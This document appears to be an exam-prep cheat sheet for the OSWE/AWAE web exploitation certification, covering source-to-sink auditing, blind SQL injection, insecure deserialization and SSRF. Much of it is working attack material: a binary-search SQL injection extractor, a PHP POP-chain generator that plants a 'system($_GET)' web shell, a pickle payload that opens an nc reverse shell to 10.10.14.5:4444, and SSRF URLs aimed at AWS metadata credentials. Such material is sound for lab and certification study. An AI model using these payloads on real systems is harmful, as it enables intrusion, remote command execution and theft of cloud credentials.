# Offensive Security Web Expert (OSWE / AWAE) — White-Box Exploitation Blueprint

## 1. White-Box Source Code Auditing Methodology

```
                   SOURCE-TO-SINK TRACE METHODOLOGY
 ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
 │ Source / Input  │ ───> │ Sanitization /  │ ───> │ Vulnerable Sink │
 │ (req.params, $_GET)     │ Parser Bypasses │      │ (exec, eval, sql)│
 └─────────────────┘      └─────────────────┘      └─────────────────┘
```

### Common High-Severity Sinks by Language
* **Node.js / JavaScript**: `eval()`, `child_process.exec()`, `vm.runInContext()`, `serialize.unserialize()`, prototype pollution via recursive merge/clone.
* **PHP**: `unserialize()`, `preg_replace('/e')`, `extract($_POST)`, `include($file)`, `assert()`, loose equality `==` comparisons (type juggling).
* **Python**: `pickle.loads()`, `yaml.load(Loader=yaml.Loader)`, `eval()`, `os.system()`, `subprocess.Popen(shell=True)`.
* **Java**: `ObjectInputStream.readObject()`, XML `DocumentBuilderFactory` without disabled external entities, Expression Language `ELProcessor.eval()`.
* **C# / .NET**: `BinaryFormatter.Deserialize()`, `XmlSerializer` with polymorphic types, `TypeNameHandling.All` in Newtonsoft.Json.

---

## 2. Advanced Blind SQL Injection & Binary Search Automation

When blind boolean or time-based SQLi exists without direct reflection, high-speed automated extraction via custom Python scripts using character-by-character binary search is mandatory.

### Binary Search Algorithm Complexity:
For an ASCII character space of $[32, 126]$ (size 95), standard linear search requires on average $\approx 47$ requests per character. Binary search reduces this to $\lceil \log_2(95) \rceil = 7$ requests per character.

### Core Extraction Logic (Python Blueprint)
```python
def extract_char_binary_search(session, url, query_template, index):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        # Payload checks if ASCII value > mid
        payload = f"' OR (ASCII(SUBSTRING(({query_template}), {index}, 1)) > {mid}) -- "
        response = session.get(url, params={"id": payload})
        if "TRUE_CONDITION_INDICATOR" in response.text:
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
```

---

## 3. Modern Insecure Deserialization

### PHP Object Injection & POP Chains
1. Identify `unserialize()` sink.
2. Locate classes defining magic methods: `__destruct()`, `__wakeup()`, `__toString()`, `__call()`.
3. Construct Property-Oriented Programming (POP) chain:

```php
class FileLogger {
    public $logFile;
    public $initMessage;
    public function __destruct() {
        file_put_contents($this->logFile, $this->initMessage);
    }
}

// Exploit Payload Generator
$payload = new FileLogger();
$payload->logFile = "/var/www/html/shell.php";
$payload->initMessage = "<?php system($_GET['c']); ?>";
echo urlencode(serialize($payload));
```

### Python Pickle Bytecode Injection
Crafting custom pickle opcodes to bypass restricted import filters:
```python
import pickle
import base64

class Exploit(object):
    def __reduce__(self):
        import os
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"Payload: {payload}")
```

---

## 4. Server-Side Request Forgery (SSRF) to Cloud Metadata & Internal RCE

### AWS Instance Metadata Service (IMDS) Exploitation
* **IMDSv1 (Unprotected GET)**:
  `http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}`
* **IMDSv2 Bypass via Header Injection**:
  Requires `PUT` to `http://169.254.169.254/latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds: 21600`.

### URL Parser Discrepancies & Parser Smuggling
* DNS Rebinding (`127.0.0.1` resolved upon secondary lookup).
* Rare IP notations:
  * Hex: `0x7f000001` ($127.0.0.1$)
  * Dword: `2130706433`
  * Octal: `017700000001`
  * IPv6 Localhost: `http://[::1]:80/`
